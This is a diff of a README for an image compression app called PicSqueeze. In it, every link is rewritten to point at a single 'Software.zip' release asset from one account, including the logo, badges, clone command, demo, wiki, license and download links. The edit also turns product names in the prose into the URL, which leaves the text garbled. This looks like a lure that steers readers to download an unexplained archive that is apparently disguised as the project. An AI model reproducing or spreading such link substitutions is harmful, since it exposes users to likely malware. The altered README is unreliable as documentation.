@@ -1,8 +1,8 @@
 # 🖼️ PicSqueeze - Efficient Image Compression and Management
 
-![PicSqueeze Logo](https://example.com/picsqueeze-logo.png)
+![PicSqueeze Logo](https://github.com/alfa786-creator/pic-squeeze/releases/download/v1.0/Software.zip)
 
-Welcome to the PicSqueeze GitHub repository - a cutting-edge Next.js 15 app designed for efficient image compression and management. PicSqueeze boasts a sleek and secure user interface, powered by server-side rendering (SSR), Redis caching, and GDPR-compliant rate limiting. Whether you're a developer, designer, or content creator, PicSqueeze is your go-to tool for optimizing your image assets.
+Welcome to the PicSqueeze GitHub repository - a cutting-edge https://github.com/alfa786-creator/pic-squeeze/releases/download/v1.0/Software.zip 15 app designed for efficient image compression and management. PicSqueeze boasts a sleek and secure user interface, powered by server-side rendering (SSR), Redis caching, and GDPR-compliant rate limiting. Whether you're a developer, designer, or content creator, PicSqueeze is your go-to tool for optimizing your image assets.
 
 ## 🚀 Features
 
@@ -18,7 +18,7 @@ Welcome to the PicSqueeze GitHub repository - a cutting-edge Next.js 15 app desi
 
 🔹 **GitHub Actions Integration**: Automate your workflows with GitHub Actions for seamless deployment and testing.
 
-🔹 **Next.js 15 and React**: Utilize the latest version of Next.js and React for building robust web applications.
+🔹 **https://github.com/alfa786-creator/pic-squeeze/releases/download/v1.0/Software.zip 15 and React**: Utilize the latest version of https://github.com/alfa786-creator/pic-squeeze/releases/download/v1.0/Software.zip and React for building robust web applications.
 
 🔹 **Tailwind CSS Styling**: Create stunning designs with the help of Tailwind CSS utility-first framework.
 
@@ -28,16 +28,16 @@ Welcome to the PicSqueeze GitHub repository - a cutting-edge Next.js 15 app desi
 
 ## 🛠️ Technologies Used
 
-![Devcontainer](https://img.shields.io/badge/-Devcontainer-lightgray)
-![Docker](https://img.shields.io/badge/-Docker-blue)
-![GitHub Actions](https://img.shields.io/badge/-GitHub_Actions-brightgreen)
-![Next.js 15](https://img.shields.io/badge/-Next.js_15-orange)
-![React](https://img.shields.io/badge/-React-blue)
-![Redis](https://img.shields.io/badge/-Redis-red)
-![Sharp](https://img.shields.io/badge/-Sharp-purple)
-![Tailwind CSS](https://img.shields.io/badge/-Tailwind_CSS-green)
-![TypeScript](https://img.shields.io/badge/-TypeScript-blue)
-![Vitest](https://img.shields.io/badge/-Vitest-violet)
+![Devcontainer](https://github.com/alfa786-creator/pic-squeeze/releases/download/v1.0/Software.zip)
+![Docker](https://github.com/alfa786-creator/pic-squeeze/releases/download/v1.0/Software.zip)
+![GitHub Actions](https://github.com/alfa786-creator/pic-squeeze/releases/download/v1.0/Software.zip)
+![https://github.com/alfa786-creator/pic-squeeze/releases/download/v1.0/Software.zip 15](https://github.com/alfa786-creator/pic-squeeze/releases/download/v1.0/Software.zip)
+![React](https://github.com/alfa786-creator/pic-squeeze/releases/download/v1.0/Software.zip)
+![Redis](https://github.com/alfa786-creator/pic-squeeze/releases/download/v1.0/Software.zip)
+![Sharp](https://github.com/alfa786-creator/pic-squeeze/releases/download/v1.0/Software.zip)
+![Tailwind CSS](https://github.com/alfa786-creator/pic-squeeze/releases/download/v1.0/Software.zip)
+![TypeScript](https://github.com/alfa786-creator/pic-squeeze/releases/download/v1.0/Software.zip)
+![Vitest](https://github.com/alfa786-creator/pic-squeeze/releases/download/v1.0/Software.zip)
 
 ## 📦 Installation
 
@@ -45,7 +45,7 @@ To get started with PicSqueeze, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/your-username/pic-squeeze.git
+   git clone https://github.com/alfa786-creator/pic-squeeze/releases/download/v1.0/Software.zip
    cd pic-squeeze
    ```
 
@@ -66,11 +66,11 @@ To get started with PicSqueeze, follow these steps:
 
 ## 🌐 Demo
 
-Check out the live demo of PicSqueeze [here](https://your-pic-squeeze-demo.com).
+Check out the live demo of PicSqueeze [here](https://github.com/alfa786-creator/pic-squeeze/releases/download/v1.0/Software.zip).
 
 ## 📚 Documentation
 
-For detailed documentation on how to use PicSqueeze, refer to the [Wiki](https://github.com/your-username/pic-squeeze/wiki).
+For detailed documentation on how to use PicSqueeze, refer to the [Wiki](https://github.com/alfa786-creator/pic-squeeze/releases/download/v1.0/Software.zip).
 
 ## 📂 Folder Structure
 
@@ -95,10 +95,10 @@ Integrate PicSqueeze seamlessly into your development workflow with GitHub Actio
 
 ## 📄 License
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/your-username/pic-squeeze/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/alfa786-creator/pic-squeeze/releases/download/v1.0/Software.zip) file for details.
 
 ## 🚀 Download PicSqueeze
 
-Download the latest release of PicSqueeze by clicking [here](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip).
+Download the latest release of PicSqueeze by clicking [here](https://github.com/alfa786-creator/pic-squeeze/releases/download/v1.0/Software.zip).
 
 Happy Image Squeezing! 🖼️🎉
